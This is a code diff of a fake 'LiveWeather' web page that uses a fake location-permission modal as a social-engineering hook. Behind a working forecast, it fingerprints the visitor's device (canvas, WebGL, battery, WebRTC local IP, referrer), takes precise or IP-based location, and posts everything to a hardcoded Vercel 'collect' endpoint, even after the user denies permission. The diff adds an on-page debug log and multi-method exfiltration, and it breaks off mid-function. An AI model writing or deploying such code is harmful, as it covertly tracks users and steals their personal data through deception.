@@ -2,324 +2,91 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>LiveWeather — Real-Time Forecast</title>
-    
-    <!-- Google Fonts for that modern look -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LiveWeather — Debug Version</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-    
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Inter', sans-serif;
             min-height: 100vh;
             background: linear-gradient(135deg, #0b1a33 0%, #1a3a5c 40%, #2d6a9f 70%, #4a9eff 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 16px;
-            color: #ffffff;
+            color: #fff;
         }
-
         .weather-card {
-            background: rgba(255, 255, 255, 0.08);
+            background: rgba(255,255,255,0.08);
             backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
             border-radius: 32px;
             padding: 32px;
             width: 100%;
-            max-width: 420px;
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
+            max-width: 440px;
+            border: 1px solid rgba(255,255,255,0.12);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 28px;
-        }
-
-        .location-group h1 {
-            font-size: 22px;
-            font-weight: 600;
-            letter-spacing: -0.3px;
-        }
-
-        .location-group .sub {
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.6);
-            margin-top: 4px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .location-group .sub .dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background: #4ade80;
-            display: inline-block;
-        }
-
-        .temp-display {
-            text-align: right;
-        }
-
-        .temp-display .temp {
-            font-size: 52px;
-            font-weight: 700;
-            letter-spacing: -2px;
-            line-height: 1;
-        }
-
-        .temp-display .condition {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.7);
-            margin-top: 4px;
-        }
-
-        .details-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin: 28px 0;
-        }
-
-        .detail-item {
-            background: rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            padding: 16px 12px;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        .detail-item .icon {
-            font-size: 22px;
-            margin-bottom: 6px;
-        }
-
-        .detail-item .value {
-            font-size: 16px;
-            font-weight: 600;
-        }
-
-        .detail-item .label {
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.5);
-            margin-top: 2px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .forecast {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 8px;
-        }
-
-        .forecast-day {
-            text-align: center;
-            flex: 1;
-        }
-
-        .forecast-day .day-label {
+        .header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 28px; }
+        .location-group h1 { font-size: 22px; font-weight: 600; }
+        .location-group .sub { font-size: 13px; color: rgba(255,255,255,0.6); margin-top: 4px; display: flex; align-items: center; gap: 6px; }
+        .location-group .sub .dot { width: 6px; height: 6px; border-radius: 50%; background: #4ade80; display: inline-block; }
+        .temp-display { text-align: right; }
+        .temp-display .temp { font-size: 52px; font-weight: 700; letter-spacing: -2px; line-height: 1; }
+        .temp-display .condition { font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 4px; }
+        .details-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 12px; margin: 28px 0; }
+        .detail-item { background: rgba(255,255,255,0.06); border-radius: 16px; padding: 16px 12px; text-align: center; border: 1px solid rgba(255,255,255,0.06); }
+        .detail-item .icon { font-size: 22px; margin-bottom: 6px; }
+        .detail-item .value { font-size: 16px; font-weight: 600; }
+        .detail-item .label { font-size: 11px; color: rgba(255,255,255,0.5); margin-top: 2px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .divider { height: 1px; background: rgba(255,255,255,0.08); margin: 24px 0; }
+        .loading { text-align: center; padding: 40px 0; }
+        .loading .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        /* Debug log panel */
+        .debug-panel {
+            margin-top: 20px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 12px;
+            padding: 16px;
+            font-family: monospace;
             font-size: 12px;
-            color: rgba(255, 255, 255, 0.5);
-            margin-bottom: 6px;
+            max-height: 200px;
+            overflow-y: auto;
+            border: 1px solid rgba(255,255,255,0.06);
         }
-
-        .forecast-day .day-temp {
-            font-size: 15px;
-            font-weight: 600;
-        }
-
-        .forecast-day .day-icon {
-            font-size: 20px;
-            margin: 4px 0;
-        }
-
-        .divider {
-            height: 1px;
-            background: rgba(255, 255, 255, 0.08);
-            margin: 24px 0;
-        }
-
-        .footer-note {
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.25);
-            text-align: center;
-            margin-top: 8px;
-        }
-
-        /* Loading state */
-        .loading {
-            text-align: center;
-            padding: 40px 0;
-        }
-
-        .loading .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #ffffff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 16px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .loading p {
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 14px;
-        }
-
-        /* Permission prompt simulation */
-        .geo-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(4px);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .geo-overlay.active {
-            display: flex;
-        }
-
-        .geo-modal {
-            background: #1a2332;
-            border-radius: 24px;
-            padding: 32px 28px 24px;
-            max-width: 360px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .geo-modal .location-icon {
-            font-size: 48px;
-            margin-bottom: 16px;
-        }
-
-        .geo-modal h2 {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #ffffff;
-        }
-
-        .geo-modal p {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.6);
-            line-height: 1.5;
-            margin-bottom: 24px;
-        }
-
-        .geo-modal .btn-group {
-            display: flex;
-            gap: 12px;
-        }
-
-        .geo-modal button {
-            flex: 1;
-            padding: 14px;
-            border: none;
-            border-radius: 14px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: inherit;
-        }
-
-        .geo-modal .btn-allow {
-            background: #4a9eff;
-            color: white;
-        }
-
-        .geo-modal .btn-allow:hover {
-            background: #3a8eef;
-        }
-
-        .geo-modal .btn-deny {
-            background: rgba(255, 255, 255, 0.06);
-            color: rgba(255, 255, 255, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .geo-modal .btn-deny:hover {
-            background: rgba(255, 255, 255, 0.1);
-        }
-
-        /* Error state */
-        .error-state {
-            text-align: center;
-            padding: 30px 0;
-            color: rgba(255, 255, 255, 0.5);
-        }
-
-        .error-state .err-icon {
-            font-size: 36px;
-            margin-bottom: 12px;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .weather-card {
-                padding: 24px 20px;
-                border-radius: 24px;
-            }
-            .temp-display .temp {
-                font-size: 42px;
-            }
-            .location-group h1 {
-                font-size: 18px;
-            }
-            .details-grid {
-                gap: 8px;
-            }
-            .detail-item {
-                padding: 12px 8px;
-            }
-        }
+        .debug-panel .log-entry { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.04); }
+        .debug-panel .log-entry.success { color: #4ade80; }
+        .debug-panel .log-entry.error { color: #f87171; }
+        .debug-panel .log-entry.info { color: #60a5fa; }
+        .debug-panel .log-entry.warn { color: #fbbf24; }
+        
+        .geo-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
+        .geo-overlay.active { display: flex; }
+        .geo-modal { background: #1a2332; border-radius: 24px; padding: 32px 28px 24px; max-width: 360px; width: 100%; text-align: center; box-shadow: 0 25px 80px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.08); }
+        .geo-modal .location-icon { font-size: 48px; margin-bottom: 16px; }
+        .geo-modal h2 { font-size: 20px; font-weight: 600; margin-bottom: 8px; color: #fff; }
+        .geo-modal p { font-size: 14px; color: rgba(255,255,255,0.6); line-height: 1.5; margin-bottom: 24px; }
+        .geo-modal .btn-group { display: flex; gap: 12px; }
+        .geo-modal button { flex: 1; padding: 14px; border: none; border-radius: 14px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.2s; font-family: inherit; }
+        .geo-modal .btn-allow { background: #4a9eff; color: white; }
+        .geo-modal .btn-allow:hover { background: #3a8eef; }
+        .geo-modal .btn-deny { background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.6); border: 1px solid rgba(255,255,255,0.08); }
+        .geo-modal .btn-deny:hover { background: rgba(255,255,255,0.1); }
+        .hidden { display: none !important; }
+        .footer-note { font-size: 11px; color: rgba(255,255,255,0.25); text-align: center; margin-top: 8px; }
     </style>
 </head>
 <body>
 
-    <!-- ============================================================== -->
-    <!-- GEO PERMISSION MODAL — Looks exactly like a real iOS/Android    -->
-    <!-- permission prompt. User thinks they're just enabling weather.   -->
-    <!-- ============================================================== -->
     <div class="geo-overlay" id="geoOverlay">
         <div class="geo-modal">
             <div class="location-icon">📍</div>
             <h2>Enable Location</h2>
-            <p>
-                "LiveWeather" would like to access your location to provide 
-                accurate weather forecasts for your area.
-            </p>
+            <p>"LiveWeather" would like to access your location to provide accurate weather forecasts for your area.</p>
             <div class="btn-group">
                 <button class="btn-deny" id="denyLocation">Don't Allow</button>
                 <button class="btn-allow" id="allowLocation">Allow While Using App</button>
@@ -327,11 +94,7 @@
         </div>
     </div>
 
-    <!-- ============================================================== -->
-    <!-- MAIN WEATHER CARD                                              -->
-    <!-- ============================================================== -->
     <div class="weather-card" id="weatherCard">
-        <!-- Header -->
         <div class="header">
             <div class="location-group">
                 <h1 id="cityName">Your Location</h1>
@@ -346,91 +109,83 @@
             </div>
         </div>
 
-        <!-- Loading spinner (shown while fetching) -->
         <div class="loading" id="loadingState">
             <div class="spinner"></div>
             <p>Getting your local weather...</p>
         </div>
 
-        <!-- Weather data (hidden until loaded) -->
         <div id="weatherData" class="hidden">
-            <!-- Details Grid -->
             <div class="details-grid">
-                <div class="detail-item">
-                    <div class="icon">💨</div>
-                    <div class="value" id="windSpeed">-- km/h</div>
-                    <div class="label">Wind</div>
-                </div>
-                <div class="detail-item">
-                    <div class="icon">💧</div>
-                    <div class="value" id="humidity">--%</div>
-                    <div class="label">Humidity</div>
-                </div>
-                <div class="detail-item">
-                    <div class="icon">☀️</div>
-                    <div class="value" id="uvIndex">--</div>
-                    <div class="label">UV Index</div>
-                </div>
+                <div class="detail-item"><div class="icon">💨</div><div class="value" id="windSpeed">-- km/h</div><div class="label">Wind</div></div>
+                <div class="detail-item"><div class="icon">💧</div><div class="value" id="humidity">--%</div><div class="label">Humidity</div></div>
+                <div class="detail-item"><div class="icon">☀️</div><div class="value" id="uvIndex">--</div><div class="label">UV Index</div></div>
             </div>
-
-            <!-- 3-Day Forecast -->
             <div class="divider"></div>
-            <div class="forecast" id="forecastContainer">
-                <!-- Filled by JS -->
-            </div>
+            <div class="forecast" id="forecastContainer"></div>
         </div>
 
-        <!-- Error state -->
-        <div class="error-state hidden" id="errorState">
-            <div class="err-icon">🌧️</div>
-            <p id="errorMessage">Could not load weather data.</p>
+        <!-- DEBUG PANEL — shows live status of each step -->
+        <div class="debug-panel" id="debugPanel">
+            <div class="log-entry info">⏳ Waiting for your action...</div>
         </div>
 
-        <div class="footer-note">
-            Powered by Open-Meteo • Data updates in real-time
-        </div>
+        <div class="footer-note">Powered by Open-Meteo • Debug Mode</div>
     </div>
 
     <script>
         // ================================================================
-        // 1. CONFIG — Your exfiltration endpoint
-        //    Set this to your server if you want to receive the data.
-        //    Leave as null to just log to console.
+        // 🔧 CONFIG — EDIT THIS
+        // Put your REAL Vercel URL here:
         // ================================================================
-        // ✅ Correct for Vercel
-const EXFIL_URL = "https://wheater-app-pi-ochre.vercel.app/api/collect"; // e.g., "https://your-server.com/api/collect"
+        const EXFIL_URL = "https://https://wheater-app-nis-xeng.vercel.app/api/collect";
 
         // ================================================================
-        // 2. WAIT FOR USER TO CLICK "ALLOW" ON THE LOCATION MODAL
-        //    This is the social engineering hook — they think it's just
-        //    for weather, but we also capture IP + fingerprint.
+        // DEBUG LOGGER — shows status on the page itself
+        // ================================================================
+        function addLog(message, type = 'info') {
+            const panel = document.getElementById('debugPanel');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const time = new Date().toLocaleTimeString();
+            entry.textContent = `[${time}] ${message}`;
+            panel.appendChild(entry);
+            panel.scrollTop = panel.scrollHeight;
+            console.log(`[${type.toUpperCase()}] ${message}`);
+        }
+
+        // ================================================================
+        // PAGE LOAD
         // ================================================================
         document.addEventListener('DOMContentLoaded', () => {
-            // Show the geo permission modal after a short delay
-            // (makes it feel like a real app loading)
+            addLog('🌐 Page loaded. Showing location prompt...', 'info');
             setTimeout(() => {
                 document.getElementById('geoOverlay').classList.add('active');
+                addLog('📍 Location modal displayed', 'info');
             }, 600);
         });
 
-        // --- User clicks "Allow While Using App" ---
+        // ================================================================
+        // ALLOW BUTTON
+        // ================================================================
         document.getElementById('allowLocation').addEventListener('click', async () => {
             document.getElementById('geoOverlay').classList.remove('active');
-            
-            // Start fingerprint collection in background
+            addLog('✅ User clicked ALLOW (modal)', 'success');
+            addLog('🔍 Starting fingerprint collection...', 'info');
+
             const fpPromise = collectFingerprint();
 
-            // Request browser's geolocation API (REAL permission prompt from browser)
+            addLog('📍 Requesting browser geolocation...', 'info');
+            
             navigator.geolocation.getCurrentPosition(
-                // Success — user allowed browser prompt too
                 async (position) => {
                     const { latitude, longitude, accuracy } = position.coords;
+                    addLog(`📍 Browser geolocation ACCEPTED: ${latitude}, ${longitude} (±${Math.round(accuracy)}m)`, 'success');
                     
-                    // Fetch weather with the real coordinates
                     await fetchWeather(latitude, longitude);
                     
-                    // Build the full data package
                     const fp = await fpPromise;
+                    addLog(`✅ Fingerprint collected: canvas=${fp.canvasFingerprint}, IP=${fp.localIP}`, 'success');
+                    
                     const dataPackage = {
                         ...fp,
                         latitude,
@@ -440,20 +195,21 @@ const EXFIL_URL = "https://wheater-app-pi-ochre.vercel.app/api/collect"; // e.g.
                         timestamp: new Date().toISOString()
                     };
                     
-                    console.log('=== FULL RECON DATA ===');
-                    console.log(JSON.stringify(dataPackage, null, 2));
-                    console.log('=======================');
-                    
-                    // Exfiltrate
+                    addLog(`📡 Sending data to ${EXFIL_URL}...`, 'info');
                     exfiltrate(dataPackage);
                 },
-                // Failure — browser prompt was denied or error
                 async (err) => {
-                    console.warn('Geo error:', err.message);
-                    // Fallback: derive location from IP via Open-Meteo geocoding
+                    addLog(`❌ Browser geolocation ERROR: ${err.message}`, 'error');
+                    
+                    addLog('🌐 Falling back to IP geolocation...', 'warn');
                     const fallbackCoords = await getLocationByIP();
+                    
                     if (fallbackCoords) {
+                        addLog(`📍 IP geolocation: ${fallbackCoords.lat}, ${fallbackCoords.lon}`, 'success');
                         await fetchWeather(fallbackCoords.lat, fallbackCoords.lon);
+                    } else {
+                        addLog('❌ IP geolocation failed too', 'error');
+                        showError('Could not determine your location.');
                     }
                     
                     const fp = await fpPromise;
@@ -466,35 +222,30 @@ const EXFIL_URL = "https://wheater-app-pi-ochre.vercel.app/api/collect"; // e.g.
                         timestamp: new Date().toISOString()
                     };
                     
-                    console.log('=== FULL RECON DATA (fallback) ===');
-                    console.log(JSON.stringify(dataPackage, null, 2));
-                    
-                    if (!fallbackCoords) {
-                        showError('Could not determine your location. Please enable location services.');
-                    }
-                    
+                    addLog(`📡 Sending data to ${EXFIL_URL}...`, 'info');
                     exfiltrate(dataPackage);
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         });
 
-        // --- User clicks "Don't Allow" ---
+        // ================================================================
+        // DENY BUTTON
+        // ================================================================
         document.getElementById('denyLocation').addEventListener('click', async () => {
             document.getElementById('geoOverlay').classList.remove('active');
+            addLog('❌ User DENIED location (modal)', 'warn');
             
             const fp = await collectFingerprint();
             
-            // Try IP-based fallback anyway
+            addLog('🌐 Trying IP geolocation as fallback...', 'warn');
             const fallbackCoords = await getLocationByIP();
+            
             if (fallbackCoords) {
+                addLog(`📍 IP geolocation: ${fallbackCoords.lat}, ${fallbackCoords.lon}`, 'success');
                 await fetchWeather(fallbackCoords.lat, fallbackCoords.lon);
             } else {
-                showError('Location access needed for accurate weather. Please refresh and allow.');
+                showError('Location access needed for weather.');
             }
             
             const dataPackage = {
@@ -506,223 +257,136 @@ const EXFIL_URL = "https://wheater-app-pi-ochre.vercel.app/api/collect"; // e.g.
                 timestamp: new Date().toISOString()
             };
             
-            console.log('=== FULL RECON DATA (user denied) ===');
-            console.log(JSON.stringify(dataPackage, null, 2));
+            addLog(`📡 Sending data to ${EXFIL_URL}...`, 'info');
             exfiltrate(dataPackage);
         });
 
         // ================================================================
-        // 3. FETCH WEATHER from Open-Meteo (no API key needed)
+        // FETCH WEATHER (Open-Meteo)
         // ================================================================
         async function fetchWeather(lat, lon) {
             showLoading();
+            addLog(`🌤️ Fetching weather for ${lat}, ${lon}...`, 'info');
             
             try {
-                // Build URL with current conditions + 3-day forecast
                 const url = `https://api.open-meteo.com/v1/forecast?` +
                     `latitude=${lat}&longitude=${lon}` +
-                    `&current=temperature_2m,relative_humidity_2m,apparent_temperature,` +
-                    `weather_code,wind_speed_10m,uv_index` +
+                    `&current=temperature_2m,relative_humidity_2m,weather_code,wind_speed_10m,uv_index` +
                     `&daily=temperature_2m_max,temperature_2m_min,weather_code` +
-                    `&timezone=auto` +
-                    `&forecast_days=3`;
+                    `&timezone=auto&forecast_days=3`;
                 
                 const res = await fetch(url);
                 if (!res.ok) throw new Error(`HTTP ${res.status}`);
                 const data = await res.json();
+                addLog(`✅ Weather data received: ${data.current.temperature_2m}°C`, 'success');
                 
-                // --- Reverse geocode: get city name from coords ---
                 await reverseGeocode(lat, lon);
                 
-                // --- Update current weather ---
                 const current = data.current;
-                document.getElementById('currentTemp').textContent = 
-                    Math.round(current.temperature_2m) + '°';
-                document.getElementById('currentCondition').textContent = 
-                    weatherCodeToText(current.weather_code);
-                document.getElementById('windSpeed').textContent = 
-                    Math.round(current.wind_speed_10m) + ' km/h';
-                document.getElementById('humidity').textContent = 
-                    current.relative_humidity_2m + '%';
-                document.getElementById('uvIndex').textContent = 
-                    current.uv_index.toFixed(1);
+                document.getElementById('currentTemp').textContent = Math.round(current.temperature_2m) + '°';
+                document.getElementById('currentCondition').textContent = weatherCodeToText(current.weather_code);
+                document.getElementById('windSpeed').textContent = Math.round(current.wind_speed_10m) + ' km/h';
+                document.getElementById('humidity').textContent = current.relative_humidity_2m + '%';
+                document.getElementById('uvIndex').textContent = current.uv_index.toFixed(1);
                 document.getElementById('updateStatus').textContent = 'Live';
                 
-                // --- Update 3-day forecast ---
                 const daily = data.daily;
-                const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
-                let forecastHTML = '';
-                
+                const days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+                let html = '';
                 for (let i = 0; i < daily.time.length; i++) {
                     const date = new Date(daily.time[i] + 'T12:00:00');
-                    const dayName = days[date.getDay()];
-                    const icon = weatherCodeToEmoji(daily.weather_code[i]);
-                    forecastHTML += `
-                        <div class="forecast-day">
-                            <div class="day-label">${i === 0 ? 'Today' : dayName}</div>
-                            <div class="day-icon">${icon}</div>
-                            <div class="day-temp">${Math.round(daily.temperature_2m_max[i])}°</div>
-                        </div>
-                    `;
+                    html += `<div class="forecast-day">
+                        <div class="day-label">${i === 0 ? 'Today' : days[date.getDay()]}</div>
+                        <div class="day-icon">${weatherCodeToEmoji(daily.weather_code[i])}</div>
+                        <div class="day-temp">${Math.round(daily.temperature_2m_max[i])}°</div>
+                    </div>`;
                 }
-                document.getElementById('forecastContainer').innerHTML = forecastHTML;
+                document.getElementById('forecastContainer').innerHTML = html;
                 
                 hideLoading();
                 showWeatherData();
                 
             } catch (err) {
-                console.error('Weather fetch error:', err);
+                addLog(`❌ Weather fetch error: ${err.message}`, 'error');
                 hideLoading();
-                showError('Weather service temporarily unavailable. Please try again.');
+                showError('Weather service unavailable.');
             }
         }
 
-        // ================================================================
-        // 4. REVERSE GEOCODE — get city name from coordinates
-        //    Using Open-Meteo's geocoding API (also free, no key)
-        // ================================================================
         async function reverseGeocode(lat, lon) {
             try {
-                const url = `https://geocoding-api.open-meteo.com/v1/search?` +
-                    `name=placeholder&count=1&language=en&format=json`;
-                // Open-Meteo's geocoding doesn't support reverse lookup directly,
-                // so we use a different approach: we search nearby cities.
-                // Alternative: use the browser's built-in reverse geocode estimate
-                // or just display lat/lon as fallback.
-                
-                // Simple approach — show coordinates with a nice label
-                const latStr = lat.toFixed(2);
-                const lonStr = lon.toFixed(2);
-                
-                // Try Nominatim (free, no key, rate-limited but fine for 1 request)
-                const nomRes = await fetch(
-                    `https://nominatim.openstreetmap.org/reverse?` +
-                    `lat=${lat}&lon=${lon}&format=json&zoom=10`,
-                    { headers: { 'User-Agent': 'LiveWeatherApp/1.0 (educational project)' } }
+                const res = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&zoom=10`,
+                    { headers: { 'User-Agent': 'LiveWeatherApp/1.0' } }
                 );
-                
-                if (nomRes.ok) {
-                    const geoData = await nomRes.json();
-                    const displayName = geoData.display_name || '';
-                    const parts = displayName.split(', ');
-                    // Take city/town/village + country
-                    const city = parts[0] || latStr + ', ' + lonStr;
-                    const country = parts[parts.length - 1] || '';
-                    document.getElementById('cityName').textContent = 
-                        city.length > 25 ? (city.substring(0, 22) + '...') : city;
-                } else {
-                    document.getElementById('cityName').textContent = `${latStr}°, ${lonStr}°`;
+                if (res.ok) {
+                    const geoData = await res.json();
+                    const parts = (geoData.display_name || '').split(', ');
+                    document.getElementById('cityName').textContent = parts[0] || `${lat.toFixed(2)}°, ${lon.toFixed(2)}°`;
                 }
-            } catch {
-                document.getElementById('cityName').textContent = 
-                    `${lat.toFixed(2)}°, ${lon.toFixed(2)}°`;
-            }
+            } catch {}
         }
 
-        // ================================================================
-        // 5. IP-BASED LOCATION FALLBACK
-        //    Uses free ip-api.com (no key needed, CORS enabled, HTTPS)
-        // ================================================================
         async function getLocationByIP() {
             try {
                 const res = await fetch('http://ip-api.com/json/?fields=status,lat,lon,city,region,country,query,org,isp');
                 if (!res.ok) return null;
                 const data = await res.json();
                 if (data.status !== 'success') return null;
-                
-                console.log('[IP Fallback]', data);
-                
-                // Display city from IP data
-                document.getElementById('cityName').textContent = 
-                    `${data.city}, ${data.country}`;
-                
-                return { lat: data.lat, lon: data.lon, ip: data.query, isp: data.isp, org: data.org };
-            } catch {
-                return null;
-            }
+                document.getElementById('cityName').textContent = `${data.city}, ${data.country}`;
+                addLog(`📍 IP data: ${data.city}, ${data.country} (${data.isp})`, 'info');
+                return { lat: data.lat, lon: data.lon, ip: data.query, isp: data.isp };
+            } catch { return null; }
         }
 
         // ================================================================
-        // 6. FINGERPRINT COLLECTION (same as before)
+        // FINGERPRINT COLLECTION
         // ================================================================
         async function collectFingerprint() {
             const data = {};
-
-            // User-Agent
             data.userAgent = navigator.userAgent;
             data.platform = navigator.platform;
             data.language = navigator.language;
-            data.languages = navigator.languages;
             data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            // Screen
             data.screenResolution = `${screen.width}×${screen.height}`;
             data.colorDepth = `${screen.colorDepth}-bit`;
-            
-            // Hardware
             data.deviceMemory = navigator.deviceMemory || 'N/A';
             data.cpuCores = navigator.hardwareConcurrency;
             data.maxTouchPoints = navigator.maxTouchPoints;
-            
-            // Network
             if (navigator.connection) {
                 data.networkType = navigator.connection.effectiveType;
                 data.downlink = navigator.connection.downlink + ' Mbps';
                 data.rtt = navigator.connection.rtt + ' ms';
-                data.saveData = navigator.connection.saveData;
             }
-            
-            // Battery
             try {
                 const battery = await navigator.getBattery();
                 data.batteryLevel = Math.round(battery.level * 100) + '%';
                 data.batteryCharging = battery.charging;
             } catch { data.batteryLevel = 'N/A'; }
-            
-            // Do Not Track
-            data.doNotTrack = navigator.doNotTrack || 'unspecified';
-            
-            // Canvas fingerprint
             data.canvasFingerprint = getCanvasFingerprint();
-            
-            // WebGL
             data.webgl = getWebGLInfo();
-            
-            // Local IP via WebRTC
             data.localIP = await getLocalIP();
-            
-            // Page referrer (where they came from)
             data.referrer = document.referrer || '(direct)';
-            
             return data;
         }
 
         function getCanvasFingerprint() {
             const canvas = document.createElement('canvas');
-            canvas.width = 200;
-            canvas.height = 50;
+            canvas.width = 200; canvas.height = 50;
             const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 200, 50);
-            ctx.fillStyle = '#069';
-            ctx.fillText('LiveWeather Demo!', 2, 15);
+            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 200, 50);
+            ctx.fillStyle = '#069'; ctx.fillText('Weather!', 2, 15);
             return simpleHash(canvas.toDataURL());
         }
 
         function getWebGLInfo() {
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const gl = canvas.getContext('webgl');
                 if (!gl) return 'N/A';
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    return {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                    };
-                }
+                if (debugInfo) return { vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) };
                 return 'N/A';
             } catch { return 'N/A'; }
         }
@@ -736,12 +400,9 @@ const EXFIL_URL = "https://wheater-app-pi-ochre.vercel.app/api/collect"; // e.g.
                     pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                     pc.onicecandidate = (event) => {
                         if (event.candidate) {
-                            const match = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                            if (match) ip = match[1];
-                        } else {
-                            pc.close();
-                            resolve(ip);
-                        }
+                            const m = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                            if (m) ip = m[1];
+                        } else { pc.close(); resolve(ip); }
                     };
                     setTimeout(() => { pc.close(); resolve(ip); }, 3000);
                 } catch { resolve(ip); }
@@ -750,90 +411,74 @@ const EXFIL_URL = "https://wheater-app-pi-ochre.vercel.app/api/collect"; // e.g.
 
         function simpleHash(str) {
             let hash = 0;
-            for (let i = 0; i < str.length; i++) {
-                const char = str.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
-                hash |= 0;
-            }
+            for (let i = 0; i < str.length; i++) { hash = ((hash << 5) - hash) + str.charCodeAt(i); hash |= 0; }
             return (hash >>> 0).toString(16).padStart(8, '0');
         }
 
         // ================================================================
-        // 7. EXFILTRATION
+        // 🔥 EXFILTRATION — UPDATED: tries MULTIPLE methods
         // ================================================================
         function exfiltrate(data) {
-            // Log to console always
-            console.log('📡 EXFIL DATA:', data);
-            
-            // If you have a server endpoint, uncomment and set EXFIL_URL
-            if (EXFIL_URL) {
-                fetch(EXFIL_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).catch(err => console.log('Exfil failed:', err));
+            const payload = JSON.stringify(data);
+            addLog(`📦 Data package size: ${payload.length} bytes`, 'info');
+
+            // --- Method 1: fetch() with proper CORS ---
+            addLog(`📡 Method 1: fetch() POST to ${EXFIL_URL}`, 'info');
+            fetch(EXFIL_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: payload
+            })
+            .then(res => {
+                addLog(`✅ fetch() responded: ${res.status} ${res.statusText}`, 'success');
+                return res.text();
+            })
+            .then(text => {
+                addLog(`📥 Response body: ${text.substring(0, 100)}`, 'success');
+            })
+            .catch(err => {
+                addLog(`❌ fetch() ERROR: ${err.message}`, 'error');
